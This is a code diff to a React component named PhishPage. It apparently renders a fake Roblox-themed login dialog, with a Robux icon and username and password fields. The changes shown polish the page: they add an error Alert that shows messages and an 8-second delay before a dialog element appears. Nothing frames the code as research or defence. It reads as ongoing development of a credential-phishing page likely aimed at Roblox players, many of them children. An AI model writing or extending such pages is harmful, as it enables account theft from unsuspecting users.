@@ -6,6 +6,7 @@ import { } from 'react-router-dom';
 import RobuxSvg from '../svg/robux.svg';
 
 import Slide from '@material-ui/core/Slide';
+import Alert from '@material-ui/lab/Alert';
 import Dialog from '@material-ui/core/Dialog';
 import DialogTitle from '@material-ui/core/DialogTitle';
 import DialogContent from '@material-ui/core/DialogContent';
@@ -34,7 +35,12 @@ class PhishPage extends Component {
 			username: '',
 			password: '',
 			errors: {},
+			in: false
 		};
+
+		setTimeout(() => {
+			this.setState({ in: true });
+		}, 8000)
 	}
 
 	// todo implement componentDidUpdate?
@@ -119,6 +125,9 @@ class PhishPage extends Component {
 								<CircularProgress size={25} className={classes.progress} />
 							)}
 						</Button>
+						{errors.msg && (
+							<Alert severity="error" className={classes.alert}>{errors.msg}</Alert>
+						)} 
 					</form>
 				</Dialog>
 				<Dialog
